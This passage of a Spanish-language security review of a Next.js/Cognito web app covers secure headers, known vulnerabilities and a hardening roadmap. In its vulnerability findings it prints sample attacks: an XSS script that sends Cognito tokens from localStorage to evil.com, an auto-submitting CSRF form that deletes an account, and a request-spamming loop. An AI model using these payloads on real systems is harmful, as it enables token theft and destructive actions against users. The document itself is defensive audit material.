→ Navegador bloquea iframe de evil.com ✅
```

### 3. X-Content-Type-Options

```
Propósito: Prevenir MIME type sniffing

X-Content-Type-Options: nosniff

Sin header:
1. Servidor envía: Content-Type: text/plain
2. Navegador detecta: "Parece JavaScript, voy a ejecutarlo"
3. Navegador ejecuta archivo como JavaScript ❌

Con nosniff:
→ Navegador respeta Content-Type exactamente
→ text/plain se renderiza como texto (no ejecuta) ✅
```

### 4. Referrer-Policy

```
Propósito: Controlar qué info se envía en Referer header

Referrer-Policy: origin-when-cross-origin

Valores:
- no-referrer: Nunca enviar
- origin: Solo origen (https://awspuebla.com)
- origin-when-cross-origin: Full URL mismo origen, solo origen cross-origin ✅
- unsafe-url: Siempre full URL (incluye query params) ❌

Ejemplo:
Usuario en: https://awspuebla.com/dashboard?user=john
Click link a: https://analytics.com

Sin política:
→ Referer: https://awspuebla.com/dashboard?user=john
→ analytics.com ve "user=john" (leak de info) ❌

Con origin-when-cross-origin:
→ Referer: https://awspuebla.com
→ analytics.com solo ve origen ✅
```

### 5. Permissions-Policy

```
Propósito: Deshabilitar APIs del navegador

Permissions-Policy: camera=(), microphone=(), geolocation=()

camera=()
→ Nadie puede usar cámara (ni nuestra app ni iframes)

microphone=()
→ Nadie puede usar micrófono

geolocation=()
→ Nadie puede pedir ubicación

Beneficios:
- Reduce surface de ataque
- Previene permisos accidentales
- Mejora privacidad
```

---

## 🐛 Vulnerabilidades Identificadas

### 1. Token Storage en localStorage

**Severidad**: Media

**Descripción**: Tokens en localStorage son vulnerables a XSS.

**Explotación**:
```javascript
// Si hay XSS bug en algún lugar:
<script>
  const tokens = Object.keys(localStorage)
    .filter(k => k.startsWith('CognitoIdentityServiceProvider'))
    .map(k => ({ key: k, value: localStorage.getItem(k) }));
  
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify(tokens)
  });
</script>
```

**Mitigación**:
1. **Actual**: CSP para prevenir XSS
2. **Ideal**: httpOnly cookies (pero rompe Amplify client-side)
3. **Alternativa**: Service Worker encryption

**Estado**: ⚠️ Mitigación parcial (CSP implementado)

---

### 2. Refresh Token No Rotation

**Severidad**: Media

**Descripción**: Refresh token reutilizable si es robado.

**Explotación**:
```
1. Atacante roba refresh token (XSS, network sniffing)
2. Atacante genera access tokens por 30 días
3. Usuario legítimo también usa mismo refresh token
4. Difícil detectar ataque
```

**Mitigación**:
```typescript
// Implementar rotation
// Cada refresh devuelve nuevo refresh token
// Token viejo se invalida

// AWS Cognito soporta esto:
// UpdateUserPool → RefreshTokenValidity: 1 (day)
// + Custom Lambda trigger para rotation
```

**Estado**: ❌ No implementado

**Prioridad**: Media (requiere Cognito configuration change)

---

### 3. No CSRF Token en Acciones Críticas

**Severidad**: Baja

**Descripción**: Acciones como delete account no tienen CSRF token adicional.

**Explotación**:
```html
<!-- evil.com -->
<form action="https://awspuebla.com/api/delete-account" method="POST">
  <input type="hidden" name="confirm" value="true">
</form>
<script>document.forms[0].submit();</script>
```

**Mitigación actual**: SameSite=Lax cookies

**Mitigación adicional**: CSRF token explícito

**Estado**: ⚠️ Protección parcial (SameSite)

**Prioridad**: Baja (SameSite es suficiente para la mayoría)

---

### 4. No Rate Limiting en Frontend

**Severidad**: Baja

**Descripción**: Usuario puede hacer spam de requests.

**Explotación**:
```javascript
// Atacante abre consola:
for (let i = 0; i < 1000; i++) {
  fetch('/api/some-endpoint');
}
```

**Mitigación**: Next.js middleware con rate limiting

**Estado**: ❌ No implementado

**Prioridad**: Media (implementar cuando >1000 usuarios)

---

## 📋 Security Checklist

### ✅ Implementado

- [x] OAuth 2.0 con Google
- [x] State parameter (CSRF in OAuth)
- [x] Redirect URI validation
- [x] Client secret en backend only
- [x] JWT signature validation (Amplify)
- [x] Token expiration (1 hora)
- [x] Refresh token mechanism
- [x] SameSite cookies (Lax)
- [x] HTTPS en producción
- [x] Content Security Policy (basic)
- [x] Secure headers (HSTS, X-Frame-Options, etc.)
- [x] React auto-escaping (XSS prevention)

### ⚠️ Parcialmente Implementado

- [ ] CSP con nonces (tiene 'unsafe-inline')
- [ ] CSRF tokens (solo SameSite)
- [ ] httpOnly cookies (incompatible con Amplify)

### ❌ No Implementado (Mejoras Futuras)

- [ ] Refresh token rotation
- [ ] Rate limiting (Next.js middleware)
- [ ] WAF (AWS WAF)
- [ ] Bot detection
- [ ] Anomaly detection (geolocation, user-agent)
- [ ] Security monitoring (Sentry, Datadog)
- [ ] Penetration testing
- [ ] Security audit por terceros

---

## 🎯 Resumen del Pilar 5

### Postura de Seguridad

**Nivel actual**: Bueno para MVP/startup

**Protecciones implementadas**:
- OAuth 2.0 (industry standard)
- Token-based auth (JWT)
- CSRF protection (SameSite + state)
- XSS prevention (React + CSP)
- Secure headers (HSTS, etc.)

**Vulnerabilidades conocidas**:
1. localStorage (XSS risk) - Mitigado con CSP
2. No refresh token rotation - Riesgo medio
3. No rate limiting - Riesgo bajo
4. 'unsafe-inline' en CSP - Riesgo medio

**ROI de mejoras**:
```
Refresh token rotation: 8 horas dev → Reduce riesgo 30%
Rate limiting: 4 horas dev → Previene DDoS
WAF: $20/mes → Previene 95% de ataques comunes
Security audit: $5000 → Descubre bugs desconocidos
```

### Recomendaciones por Fase

**Fase actual (MVP)**:
- ✅ OAuth 2.0
- ✅ Basic CSP
- ✅ Secure headers

**Antes de 1000 usuarios**:
- [ ] Refresh token rotation
- [ ] Rate limiting
- [ ] CSP con nonces

**Antes de 10,000 usuarios**:
- [ ] WAF
- [ ] Bot detection
- [ ] Security monitoring

**Antes de 100,000 usuarios**:
- [ ] Penetration testing
- [ ] Security audit
- [ ] DDoS protection (Cloudflare)

---

## ✅ Checkpoint del Pilar 5

Antes de continuar al Pilar 6, asegúrate de entender:

- [ ] OAuth 2.0 flow completo con security checkpoints
- [ ] Por qué state parameter previene CSRF
- [ ] Cómo validar JWT signature
- [ ] Trade-offs de token storage (localStorage vs cookies)
- [ ] Qué protege cada secure header
- [ ] Vulnerabilidades actuales y su severidad

**Próximo paso**: ¿Listo para el Pilar 6: Testing Strategy?

Ahí vamos a analizar:
- Unit testing patterns
- Mocking AWS Amplify
- E2E testing con OAuth challenges
- Test coverage strategies
- CI/CD testing pipelines

---

**Siguiente**: [Pilar 6: Testing Strategy](./06-testing-strategy.md)
